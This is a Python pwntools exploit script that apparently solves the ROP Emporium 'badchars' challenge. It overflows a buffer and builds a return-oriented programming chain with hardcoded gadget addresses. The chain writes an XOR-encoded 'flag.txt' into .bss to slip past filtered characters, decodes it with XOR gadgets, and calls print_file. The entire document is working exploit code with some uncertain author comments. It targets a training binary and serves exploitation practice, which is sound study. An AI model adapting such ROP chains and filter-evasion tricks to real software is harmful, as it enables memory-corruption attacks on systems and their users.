from pwn import *

elf = context.binary = ELF('./badchars', checksec=False)
context.log_level = 'debug'

io = process()

pop_r12_r13_r14_r15 = 0x40069c		# pop r12; pop r13; pop r14; pop r15; ret;
pop_r14_r15 = 0x4006a0				# pop r14; pop r15; ret;
mov_r13_r12 = 0x400634				# mov qword ptr [r13], r12; ret;
bss = 0x00601038					# .bss section that is writable that we want to write (rabin2 -S badchars) ( .data doesnt work idk why)


xor_r15_r14b = 0x400628				# xor byte ptr [r15], r14b; ret;
ret = 0x4004ee 						# ret
pop_rdi = 0x4006a3					# pop rdi; ret;



## Find offset

# Set the charset first to generate string
# cyclic -a bcdefhijklm

# Check offset
# cyclic -a bcdefhijklm -l hbbbbbbb



# Xor function to encrypt
def xor():
	encrypted = ''
	flag = 'flag.txt'
	for i in flag:
		encrypted += chr(ord(i) ^ 5)
	return encrypted


encrypted = xor()


# Payload to send until xored inputs
payload = flat(
	b'A' * 40,
	pop_r12_r13_r14_r15,			# Populate the 4 registers, r12, r13, r14 and r15
	encrypted,						# Goes into r12
	bss,							# Goes into r13
	0x0,							# Filler for r14
	0x0,							# Filler for r15
	mov_r13_r12,					# Writes r12 (value) to r13 pointer (location)
)


# For loop to xor back (decrypt) encrypted inputs
xor_key = 5

for i in range(len(encrypted)):
	payload += flat(
		pop_r14_r15,				# Populates the r14 with 'xor_key', r15 with bss location that increments by 1 every loop
		xor_key,
		bss+ i,
		xor_r15_r14b				# XOR's the data located at the location with r14b value (key = 5)
	)								# r14b is the lowest 8 bits of r14 


payload += flat(
	pop_rdi,						# Param first with gadget then call function
	bss,
	ret,
	elf.plt['print_file']		
)


io.sendline(payload)
io.interactive()

# For some reason splitting the text also doesnt work??



